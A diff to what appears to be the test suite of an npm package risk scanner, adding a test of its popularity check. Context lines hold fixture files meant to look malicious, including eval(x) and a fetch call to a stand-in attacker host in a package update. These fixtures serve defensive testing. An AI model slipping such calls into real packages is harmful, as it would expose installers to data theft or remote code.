@@ -105,6 +105,15 @@ test('against the version before: what it adds and changes, its publisher and pr
     'npm counts none of its downloads: unpopular, saying so, first published half a day before the open version')
 })
 
+test('a package few download is flagged as unpopular, but where its popularity isn\'t asked, as own scopes take', async t => {
+  const asked = npm(t, [{ name: 'own', versions: [version('own', '1.0.0', { 'package.json': '{}' }, { dependencies: {} }, ago(400))] }],
+    { own: { start: '2026-08-01', end: '2026-10-11', downloads: [] } })
+  assert.ok(ids(await assessNpm('own', '1.0.0', { now: NOW })).includes('popularity'))
+  asked.length = 0
+  assert.ok(!ids(await assessNpm('own', '1.0.0', { now: NOW, popularity: false })).includes('popularity'))
+  assert.ok(!asked.some(url => url.startsWith('https://api.npmjs.org/downloads/')), 'nor its downloads asked')
+})
+
 test('what is read is kept by type, and an assessment kept needs no tarball', async t => {
   const files = { 'package.json': '{}', 'index.js': 'eval(x)\n' }
   const asked = npm(t, [{ name: 'kept', versions: [version('kept', '1.0.0', files, { dependencies: {} }, ago(400)), version('kept', '1.1.0', { ...files, 'more.js': 'fetch("https://collector.attacker.dev/x")' }, { dependencies: {} }, ago(300))] }],
